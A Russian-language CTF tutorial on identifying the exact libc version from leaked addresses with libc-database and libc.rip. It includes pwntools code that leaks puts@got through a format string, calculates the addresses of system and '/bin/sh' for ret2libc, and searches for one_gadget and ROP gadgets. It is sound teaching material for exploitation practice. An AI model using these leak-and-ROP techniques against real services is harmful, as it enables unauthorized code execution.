В ret2libc и heap-эксплуатации нельзя обойтись «примерными» адресами: `system`, `"/bin/sh"`, `__free_hook`, `environ`, one-gadget'ы имеют **разные смещения в каждой сборке libc**. Ошибка даже в несколько байт превращает рабочий эксплойт в падение по SIGSEGV. Поэтому идентификация точной версии libc по утечке — базовый ежедневный навык pwn-специалиста, такой же обязательный, как поиск гаджетов. В этом уроке — полный рабочий процесс: сбор утечек, локальная база `libc-database`, онлайн-сервис `libc.rip`, расчёт базы и оффсетов, подбор one-gadget и типичные ловушки.

## Почему важна точная версия libc

Дело в том, что libc — это динамически линкуемая библиотека, и её внутренняя раскладка меняется от релиза к релизу. Даже минорное обновление Ubuntu (например, `2.31-0ubuntu9.2` против `2.31-0ubuntu9.9`) сдвигает часть символов, потому что патчи добавляют код и меняют выравнивание. Различия проявляются в нескольких местах: адреса экспортируемых функций (`system`, `execve`, `read`), адрес строки `"/bin/sh"`, адреса внутренних структур (`_IO_2_1_stdout_`, `__exit_funcs`, `main_arena`), смещения `__libc_start_main_ret`, а также набор доступных one-gadget'ов. Помимо этого, некоторые цели существуют лишь в определённых диапазонах версий: хуки `__malloc_hook`/`__free_hook` есть только до glibc 2.34, а `_IO_str_overflow` эксплуатируется по-разному до и после 2.28. Если вы возьмёте libc «наугад», вы рискуете тем, что вызов `system` приведёт в середину чужой функции.

## Что нужно для идентификации

Минимальный набор данных — это **две утечки** из libc (или одна известная функция плюс знание её роли). Источники утечек бывают разные: адрес `puts`/`printf`/`read`, полученный через `puts@got` после вызова `puts`; адрес возврата в `__libc_start_main` (часто печатается при переполнении или format string); адрес `_IO_2_1_stdout_` при FSOP-подготовке; адрес `environ` для утечки стека. По одной утечке алгоритм поиска даёт несколько кандидатов, по двум — почти всегда ровно одну версию. Если бинарь приложен вместе с `libc.so.6` (типично для CTF), идентификация не нужна — просто загрузите приложенный файл через `ELF('./libc.so.6')`. Задача идентификации возникает, когда libc не дана, а есть только удалённый сервис.

## Инструменты: libc-database

Локальная база `libc-database` от niklasb — стандарт де-факто для оффлайн-идентификации. Установка и наполнение:

```bash
git clone https://github.com/niklasb/libc-database
cd libc-database
./get                     # скачать полную базу (или ./get ubuntu для подмножества)
./get ubuntu              # только Ubuntu-сборки — быстрее и обычно достаточно
```

После скачивания база содержит тысячи `libc.so.6` с индексом символов. Поиск по одному символу выполняется так:

```bash
./find printf 260
./find puts 6f0
./find read 0
./find __libc_start_main_ret 083
```

Аргумент — это пара `symbol offset`, где `offset` — **младшие три hex-цифры** (12 бит) смещения символа. Почему только 12 бит? Потому что страница памяти — это 4 КБ = 4096 = 0x1000, и младшие 12 бит адреса символа внутри библиотеки постоянны при любом ASLR: рандомизация сдвигает базу, но не сдвигает внутреннее смещение. Комбинируя несколько пар, вы получаете пересечение:

```bash
./find printf 260 puts 6f0 read 0
```

Это выведет список кандидатов, каждый — файл вроде `ubuntu-20.04-amd64/libc6_2.31-0ubuntu9.9_amd64`. Скачать найденную библиотеку можно командой `./download <id>`. Если у вас уже есть файл libc (например, скомпилированный локально), его можно добавить в базу и опознать:

```bash
./add ./libc.so.6
./identify ./libc.so.6
```

## Инструменты: libc.rip и другие

Когда локальной базы под рукой нет, используйте онлайн-сервис `libc.rip`. Формат ввода тот же: пары `symbol offset` (последние три hex-цифры), можно указать несколько. Сервис возвращает список версий с прямыми ссылками на скачивание. Аналог — `libc.blukat.me` (тоже база по символам) и `libc-database`-зеркала. Важно: онлайн-сервисы не требуют установки, но зависят от сети; для соревнований с изолированной сетью держите локальную базу. Ещё один полезный приём — `libc-database` умеет искать по `build-id`: если бинарь сообщает build-id (например, через утечку или `ldd`), он однозначно идентифицирует сборку.

## Разобранный пример: утечка puts

Покажем сквозной сценарий. Пусть программа утекает адрес `puts` через печать `puts@got` после вызова `puts`.

**Шаг 1. Получить утечку и вычислить младшие биты.**

```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall')

p.recvuntil(b'name: ')
p.sendline(b'%7$s' + p64(elf.got['puts']))   # или ret2libc-цепочка
leak_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('puts @ %#x', leak_puts)
log.info('puts low 12 bits: %03x', leak_puts & 0xfff)
```

**Шаг 2. Идентифицировать версию.**

```bash
$ ./find puts 6f0
ubuntu-16.04-amd64/libc6_2.23-0ubuntu11.3_amd64
ubuntu-18.04-amd64/libc6_2.27-3ubuntu1.6_amd64
$ ./find puts 6f0 printf 260
ubuntu-18.04-amd64/libc6_2.27-3ubuntu1.6_amd64
```

**Шаг 3. Скачать и проверить.**

```bash
./download libc6_2.27-3ubuntu1.6_amd64
```

**Шаг 4. Вычислить адреса.**

```python
libc = ELF('./libc6_2.27.so', checksec=False)
libc.address = leak_puts - libc.symbols['puts']
log.success('libc base @ %#x', libc.address)
system = libc.address + libc.symbols['system']
binsh  = libc.address + next(libc.search(b'/bin/sh\x00'))
```

Теперь можно строить ROP: `pop rdi; ret` → `binsh` → `system` (при необходимости с выравниванием стека через лишний `ret`).

## Работа с __libc_start_main_ret

Очень часто переполнение перезаписывает сохранённый адрес возврата, который указывает внутрь `__libc_start_main` (в glibc 2.31 это `__libc_start_main+243`). Младшие 12 бит этого адреса **специфичны для версии** и служат отличным «отпечатком»:

```bash
./find __libc_start_main_ret 083
```

Это надёжнее, чем один символ функции, потому что смещение точки возврата внутри `__libc_start_main` меняется между релизами. Но помните: утечка `__libc_start_main_ret` даёт адрес **кода**, а не символа, поэтому вычитать нужно смещение `__libc_start_main_ret` из самой библиотеки, а не `symbols['__libc_start_main']`. В pwntools это делают так:

```python
libc.address = leak - libc.symbols['__libc_start_main'] - 243
```

## Подбор one-gadget и гаджетов

`one_gadget` анализирует libc и находит адреса, по которым сразу выполняется `execve("/bin/sh", ...)`. У каждого one-gadget есть ограничения на регистры (например, `[rsp+0x30] == NULL` или `r12 == NULL`); их надо выполнить до прыжка.

```bash
one_gadget ./libc6_2.27.so
one_gadget ./libc6_2.27.so -l 2      # больше кандидатов, ниже надёжность
one_gadget ./libc6_2.27.so --raw     # только адреса/смещения
```

Для поиска обычных гаджетов используйте ROPgadget или ropper:

```bash
ROPgadget --binary ./libc6_2.27.so --only "pop|ret"
ROPgadget --binary ./libc6_2.27.so --only "pop|ret" | grep "pop rdi"
ropper --file ./libc6_2.27.so --search "pop rdi"
```

## Частые ошибки

- **Одна утечка.** Даёт несколько кандидатов; берите вторую утечку для сужения.
- **Путаница младших бит и полного оффсета.** `./find` принимает только младшие 3 hex-цифры; полный адрес символа вы берёте уже из найденного файла.
- **Не тот символ.** Убедитесь, что утечка действительно из libc, а не из PIE-бинаря. Адреса PIE обычно начинаются с `0x55...`/`0x56...`, libc — с `0x7f...`.
- **Distro-патчи.** Официальная сборка glibc и пакет Ubuntu/Debian могут отличаться; ищите именно пакетную сборку.
- **Забыт базовый адрес.** Пока не выполнено `libc.address = leak - offset`, обращения к `libc.symbols[...]` вернут смещения, а не адреса.
- **Неверное выравнивание стека.** Даже с верными адресами `system` может упасть на `movaps` — добавьте лишний `ret` для выравнивания.
- **Не тот one-gadget.** Проверяйте ограничения; «первый по списку» часто не выполняется.

## Что дальше / решение

Дальше: `pwn-ret2libc` (применение найденных оффсетов в цепочке), `pwn-got-plt` (источники утечек), `pwn-pie-bypass` (обход рандомизации), `pwn-house-lore` и heap-уроки (использование `__free_hook`/`_IO_*`). Практический алгоритм: (1) соберите 1–2 утечки libc; (2) посчитайте младшие 12 бит и запустите `./find` или `libc.rip`; (3) скачайте найденную сборку; (4) установите `libc.address = leak - offset`; (5) вычислите `system`, `"/bin/sh"`, при необходимости one-gadget; (6) постройте и проверьте цепочку локально на той же libc. Всегда проверяйте эксплойт на **именно той** версии, что найдена, иначе локальный успех не гарантирует удалённый.
## Сбор утечки через формат-строку и ret2libc

Помимо `puts@got`, версию libc можно определить по утечке, полученной через format string. Позиционный спецификатор `%N$p` печатает содержимое регистров-сейв-области `printf`, среди которых часто оказывается адрес возврата в libc (`__libc_start_main+243`) или адрес самой функции `printf`. Алгоритм: подайте `%1$p.%2$p....%40$p`, соберите дамп, отфильтруйте значения, начинающиеся с `0x7f` — это адреса libc. Затем возьмите младшие 12 бит каждого и прогоните через `./find`. Если утекли `__libc_start_main+243`, используйте `./find __libc_start_main_ret <low12>`; если утекли `printf`, используйте `./find printf <low12>`. Комбинируя две утечки, вы почти всегда получаете единственную версию. Не забывайте, что позиция буфера и позиции libc-указателей зависят от компилятора и глубины стека, поэтому перебор обязателен.

## Проверка найденной libc перед эксплуатацией

После скачивания сборки не доверяйте ей слепо. Проверьте, что символы на месте и смещения совпадают:

```bash
readelf -s ./libc6_2.27.so | grep -E " system$| puts$| execve$"
objdump -T ./libc6_2.27.so | grep -E " system$| puts$"
python3 -c "from pwn import *; l=ELF('./libc6_2.27.so'); print(hex(l.symbols['system']), hex(l.symbols['puts']))"
```

Затем локально запустите эксплойт против процесса, использующего именно этот файл: `LD_PRELOAD=./libc6_2.27.so ./chall` (для динамических бинарей) или через `patchelf --set-interpreter ./ld-2.27.so --set-rpath . ./chall`. Если локально эксплойт работает, а удалённо нет — почти всегда виновата другая сборка или неверное выравнивание стека, а не сама логика. Для полной уверенности сверьте build-id: `file ./libc6_2.27.so` и `readelf -n ./libc6_2.27.so | grep "Build ID"`.

## Идентификация по нескольким символам и разрешение неоднозначностей

Когда `./find` возвращает несколько кандидатов, добавьте пары символов до однозначности. Порядок добавления: сначала редкие символы (`read`, `write`, `__libc_start_main_ret`), затем общие (`printf`, `puts`, `malloc`). Если и это не помогло, воспользуйтесь дополнительной информацией: размер файла libc, версия glibc из баннера сервиса, дистрибутив (Ubuntu/Debian/CentOS), дата сборки. Иногда помогает `strings ./libc.so.6 | grep -i "GNU C Library"` — строка версии прямо указывает на релиз. В крайнем случае перебирайте кандидатов, подставляя их в эксплойт: правильная версия даст shell, неправильная — падение.
